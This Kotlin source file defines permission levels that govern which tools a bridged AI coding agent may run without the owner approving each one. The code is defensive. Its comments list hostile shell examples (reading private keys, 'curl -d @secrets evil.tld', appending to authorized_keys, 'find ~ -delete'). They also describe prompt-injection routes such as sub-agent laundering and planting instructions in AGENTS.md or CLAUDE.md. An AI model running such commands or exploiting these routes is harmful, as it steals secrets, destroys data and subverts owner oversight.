package dev.ccpocket.daemon.bridge

/**
 * How much authority ONE externally submitted bridge request carries into its turn. A per-turn grant, armed
 * at hand-off and revoked at TurnResult / process end — never a standing rule (issue #91's whole point:
 * an approval must not become a blank cheque for later, attacker-supplied prompts).
 *
 * The three levels differ ONLY in how many human taps the request cost, and therefore in which walls stay
 * standing. Nothing here widens WHAT a bridge can reach: the tier ceiling ([TierClamp]), the frame whitelist
 * ([BridgeCaps]) and the workdir allow-list ([BridgeGuard]) apply identically at every level.
 *
 *  - [NONE] — the default. Every tool ask routes to the owner's phone (Bash first passing
 *    BridgeCommandPolicy's deny/allow walls). This is what an unapproved request gets.
 *  - [OWNER_APPROVED] (issue #190) — the owner READ this exact request on their phone and approved it, so
 *    the resulting turn runs with no second layer of piecemeal approval. Because a human vetted the prompt
 *    itself, this level deliberately also clears the Bash and path walls: the owner is the wall.
 *  - [REVIEWER_APPROVED] (reviewed trust) — the owner pre-set this chat to Guardian review, and the
 *    independent reviewer classified THIS request as clearly low-risk and on-contract. NOT an owner
 *    approval: no human read the prompt, so its ceiling is IDENTICAL to [AUTO_TRUSTED] (the same closed
 *    [autoRunnable] list, same walls) — the distinct value exists so audit can tell "the owner trusts this
 *    chat outright" from "a model judged this one request", and so the reviewed level can later be
 *    tightened on its own without touching trusted chats. It must never widen anything.
 *  - [AUTO_TRUSTED] (issue #198) — the owner marked this CHAT trusted in advance, so a member's request runs
 *    with NO per-request card. Nobody read the prompt, so this level authorizes ONLY the tools whose reach is
 *    bounded by machinery rather than by a human reading the prompt: see [autoRunnable]. Everything else —
 *    Bash above all — still routes to the owner. Fewer taps, not more reach: a trusted chat's ceiling stays
 *    strictly BELOW that of a request the owner personally read.
 */
enum class BridgeGrant {
    NONE,
    OWNER_APPROVED,
    REVIEWER_APPROVED,
    AUTO_TRUSTED,
    ;

    /** The two machine-confined levels share ONE closed-ceiling judgement — a single entry point on purpose
     *  (design §9.2): a copied list would drift, and drift here is a security bug. */
    val machineConfined: Boolean get() = this == AUTO_TRUSTED || this == REVIEWER_APPROVED

    /** True when the grant authorizes ordinary execution tools without a per-tool ask. */
    val authorizes: Boolean get() = this != NONE

    companion object {
        /**
         * The tools [AUTO_TRUSTED] may run with no owner card — a CLOSED allow-list, deliberately, because the
         * property that makes this level safe is not "we blocked the bad things" but "everything here is
         * confined by the workdir wall the daemon enforces on its own" (PermissionBridge's `outOfScopeTarget`,
         * keyed on these tools' path arguments).
         *
         * Why the two obvious candidates are absent:
         *
         *  - **Bash.** Its gate ([dev.ccpocket.daemon.agent.BridgeCommandPolicy]) is a tiny provable ALLOW list,
         *    a best-effort DANGEROUS blacklist, and ASK for everything else — and that blacklist is only
         *    tolerable BECAUSE a bypassed entry falls through to ASK, where a human still decides. Promoting
         *    ASK to ALLOW here would delete that backstop and hand a chat member arbitrary shell with no tap:
         *    `cat ~/.cc-pocket/identity.json` (the daemon's own E2E + relay private keys — not a path the file
         *    wall covers, and not a shape SecretRedactor masks), `curl -d @secrets evil.tld`, `>> authorized_keys`,
         *    `find ~ -delete`. So Bash keeps its normal three-way verdict: proven-safe or owner-whitelisted runs,
         *    DANGEROUS is refused, the ambiguous middle asks the owner. An owner who wants a specific command to
         *    run untapped has the per-bridge `allowedCommands` list for exactly that — a grant they typed out.
         *  - **Anything not listed** (MCP tools, WebFetch/WebSearch, a future or renamed file tool). The workdir
         *    wall is keyed on the path arguments the daemon knows; a tool carrying none passes it VACUOUSLY. An
         *    open-by-default rule would therefore silently hand over every configured MCP server and every
         *    egress sink, and would quietly widen itself on the next CLI tool rename. Unknown ⇒ ask the owner.
         *
         * ExitPlanMode is excluded too (approving a plan is a human decision by contract), as is AskUserQuestion
         * (its answer rides the verdict, so auto-allowing answers nothing) — both simply reach the owner.
         *
         * Tool NAME is a necessary but not sufficient condition: PermissionBridge additionally requires a
         * resolved in-scope target for [SPECIFIC_FILE_TOOLS] and refuses targets that [executesForTheOwner].
         */
        fun autoRunnable(toolName: String): Boolean = toolName in AUTO_RUNNABLE_TOOLS

        /** Tools that act on ONE named file, so "no resolved target" means the workdir wall proved nothing. */
        val SPECIFIC_FILE_TOOLS = setOf("Read", "Write", "Edit", "MultiEdit", "NotebookEdit")

        // declared after SPECIFIC_FILE_TOOLS on purpose: a companion initializes in declaration order, so
        // referencing it above would build this set from a null
        private val AUTO_RUNNABLE_TOOLS = SPECIFIC_FILE_TOOLS + setOf(
            // search — path/pattern scoped by the same wall; an absent `path` legitimately means the session cwd
            "Glob", "Grep",
            // bookkeeping with no reach outside the session
            "TodoWrite",
        )
        // DELIBERATELY ABSENT: `Task`. The argument for including it would be "a sub-agent's own tool calls come
        // back through this same gate one by one, so spawning one grants nothing extra" — but nothing in this
        // repo verifies that. scripts/probe-claude-wire.py's task scenario asserts the sub-agent's events are
        // tagged and reported, NOT that a sub-agent's Bash raises its own `can_use_tool` control request. Every
        // other member of the list is confined by a path argument the DAEMON inspects; Task would be confined by
        // CLI behaviour we merely assume. If that assumption is false or drifts, "have a subagent run X"
        // launders the whole shell hole back in with no card anywhere. One tap for a sub-agent is the right
        // price until the probe pins it down.

        /**
         * True for an in-project file that EXECUTES on the owner's next interaction, so writing it unattended is
         * a persistence primitive rather than a code change: git's own config and hooks (`core.pager`,
         * `diff.external`, `pre-commit`), the agent config directories whose contents shape the owner's next
         * Claude/Codex/OpenCode session (hooks, MCP servers, instruction loading), and the standing instruction
         * files those sessions ingest as prompt. The bridge's own agent runs clean-room, but the OWNER's
         * sessions in that project do not — nor does their terminal.
         *
         * Matched on path SEGMENTS of the resolved target, so `src/dotgit-notes.md` is unaffected while
         * `.git/hooks/pre-commit`, `a/.claude/settings.json` and `.envrc` all match. Segment comparison is
         * case-INsensitive because the macOS filesystem is: `agents.MD` and `AGENTS.md` are the same on-disk
         * file, so a case-sensitive wall would be a one-character bypass. It stays a WHOLE-segment match on
         * purpose — `docs/agents-notes.md` and `src/claude.md.backup` are ordinary files no later session
         * loads, and widening to substrings would turn the wall into a nuisance filter. These do not become
         * forbidden — they become "ask the owner", which is the one tap this whole feature is trading away.
         */
        fun executesForTheOwner(target: String): Boolean {
            val parts = target.replace('\\', '/').split('/').filter { it.isNotEmpty() }.map { it.lowercase() }
            if (parts.any { it in ON_ACCESS_EXEC_DIRS }) return true
            return parts.lastOrNull() in ON_ACCESS_EXEC_FILES
        }

        // Directories whose CONTENTS become the owner's execution: .git carries hooks and exec-shaped config,
        // and .claude / .codex / .opencode carry the settings, hooks, MCP servers and instruction files the
        // owner's next Claude/Codex/OpenCode session in that project loads without anyone reading them first
        // (§21.5 P1-4). Lowercase entries; executesForTheOwner lowercases before comparing.
        private val ON_ACCESS_EXEC_DIRS = setOf(".git", ".claude", ".codex", ".opencode")

        // direnv runs .envrc on the owner's next `cd`; .mcp.json / .claude.json configure MCP servers the
        // owner's next session in that project offers to load — all the same class as a git hook: bytes that
        // turn into the OWNER's execution later, so an unattended write gets a card (reviewed-trust Low-1).
        // AGENTS.md / CLAUDE.md / CLAUDE.local.md are that same class in prose: agents auto-load them as
        // standing instructions, so an unattended write is a persistent prompt-injection seat, not a doc edit
        // (§21.5 P1-4). Lowercase entries; executesForTheOwner lowercases before comparing.
        private val ON_ACCESS_EXEC_FILES = setOf(
            ".envrc", ".mcp.json", ".claude.json",
            "agents.md", "claude.md", "claude.local.md",
        )
    }
}
